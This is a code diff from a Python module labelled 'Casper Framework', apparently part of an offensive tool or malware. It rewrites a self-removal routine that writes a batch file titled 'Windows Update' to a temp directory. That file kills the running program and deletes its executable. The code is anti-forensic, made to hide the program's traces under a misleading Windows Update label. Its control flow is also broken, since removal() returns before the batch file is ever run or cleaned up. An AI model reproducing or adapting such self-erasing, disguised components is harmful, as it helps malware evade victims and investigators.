@@ -3,27 +3,66 @@ Part of Casper Framework
 '''
 from includes import *
 
-payload = '''title Windows Update
-ping -n 5 127.0.0.1
-taskkill /IM main.exe
-ping -n 5 127.0.0.1
-del /q /f main.exe'''
-
-def batch_file():
-	try:
-		file = open("temp.bat", "wb")
-		file.write(payload)
-		file.close()
-		return True
-	except Exception as e:
-		print "[casper] Unable to create batch file > {}".format(e)
-
-def removal():
-	if (batch_file() == True):
+def remove_payload(file):
+	"""
+	if we find the payload on disk, delete it and move on
+	"""
+	if os.path.isfile(file) == True:
 		try:
-			os.system("temp.bat")
+			os.remove(file)
 			return True
-		except Exception as e:
-			print "[casper] Unable to run the batch file > {}".format(e)
+		except:
+			return False
 	else:
-		pass
+		logging.debug("[casper] payload not found")
+		return False
+
+def payload(file):
+	"""
+	payload template for killing process and removing
+	it after execution, very budget lulz
+	"""
+	payload = "title Windows Update >nul & ping -n 5 127.0.0.1 >nul & taskkill /IM {} >nul & ping -n 5 127.0.0.1 >nul & del /q /f {} >nul".format(sys.argv[0],sys.argv[0])
+	try:
+		pload = open(os.path.join(temp_directory(),file),"wb")
+		pload.write(payload)
+		pload.close()
+		return True
+	except:
+		return False
+
+def payload_run(file):
+	"""
+	payload template for killing process and removing
+	it after execution, very budget lulz
+	"""
+	try:
+		os.system(os.path.join(temp_directory(),file))
+		return True
+	except:
+		return False
+
+def removal(file):
+	"""
+	attempts to remove myself using a batch file that will
+	kill the process and sleep, and delete the file from
+	disk and exit
+	"""
+	if (payload(file) == True):
+		logging.debug("[casper] Successfully saved payload to disk")
+		return True
+	else:
+		logging.debug("[casper] Error, couldn't save payload to disk")
+		return False
+	if (payload_run(file) == True):
+		logging.debug("[casper] Successfully ran payload")
+		return True
+	else:
+		logging.debug("[casper] Error, couldn't run payload")
+		return False
+	if (remove_payload(file) == True):
+		logging.debug("[casper] Successfully removed payload from disk")
+		return True
+	else:
+		logging.debug("[casper] Error, couldn't remove payload from disk")
+		return False
